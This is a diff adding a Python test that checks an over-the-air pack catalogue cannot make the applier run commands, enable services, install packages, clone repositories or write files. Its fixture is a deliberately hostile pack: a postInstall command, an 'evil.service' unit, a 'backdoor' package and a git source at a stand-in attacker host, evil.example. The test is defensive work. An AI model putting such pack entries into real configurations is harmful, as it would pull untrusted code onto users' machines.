@@ -248,3 +248,53 @@ def test_the_app_packs_apply_end_to_end_without_touching_the_system(packs, tmp_p
         assert results, f"{pack.id} applied nothing at all"
         assert all(r.ok for r in results), \
             [r.message for r in results if not r.ok]
+
+
+# ── nothing the applier does may arrive over the network ───────────────────
+
+def test_a_remote_pack_reaches_the_applier_with_nothing_to_apply(tmp_path, ctx):
+    """The seam between the OTA catalogue and everything that touches the box.
+
+    Every block this module acts on writes files, installs packages, clones
+    repositories, enables units or runs commands. Those are precisely the
+    powers a signed remote catalogue must not have: a signature says who sent
+    the bundle, not that they were careful, and the endpoint is one DNS or TLS
+    compromise from belonging to somebody else.
+
+    `ota.apply_bundle` strips them on arrival and `loader` strips them again on
+    read. This asserts the result at the far end, where it actually matters —
+    the two strips could both be removed by someone who only grepped for
+    "FORBIDDEN_BLOCKS" and never came here.
+    """
+    from backend.services.catalog import Pack
+    from backend.services.catalog.ota import FORBIDDEN_BLOCKS
+
+    # No `install` block: `apply()` would hand it to the flatpak provider, and
+    # this suite must never install, uninstall or override anything for real.
+    # The provider is covered in test_installer_providers.py, with doubles.
+    hostile = {
+        "id": "probe", "kind": "app", "label": "Probe", "platform": "probe",
+        "color": "#000000", "launch": {"path": "flatpak", "args": "run @APPID@"},
+        "postInstall": [{"run": "touch " + str(tmp_path / "pwned")}],
+        "services": [{"unit": "evil.service", "scope": "user", "enable": True}],
+        "packages": {"pacman": ["backdoor"]},
+        "sources": [{"git": "https://evil.example/x", "dest": "lib/x"}],
+        "files": [{"src": "a", "dest": str(tmp_path / "written")}],
+    }
+    # What the loader hands downstream for a pack read out of the OTA tier.
+    from backend.services.catalog.loader import _strip_privileged
+    data = dict(hostile)
+    _strip_privileged(data, "probe")
+    for block in FORBIDDEN_BLOCKS:
+        data.pop(block, None)
+
+    pack = Pack(id="probe", data=data, path=tmp_path / "pack", origin="remote")
+    pack.path.mkdir(exist_ok=True)
+
+    results = apply(pack, ctx)
+
+    assert all(r.ok for r in results), [r.message for r in results if not r.ok]
+    assert enabled_units(pack, ctx) == []
+    assert not (tmp_path / "pwned").exists(), "a remote pack ran a command"
+    assert not (tmp_path / "written").exists(), "a remote pack wrote a file"
+    assert pack.generator is None, "a remote pack contributed executable code"
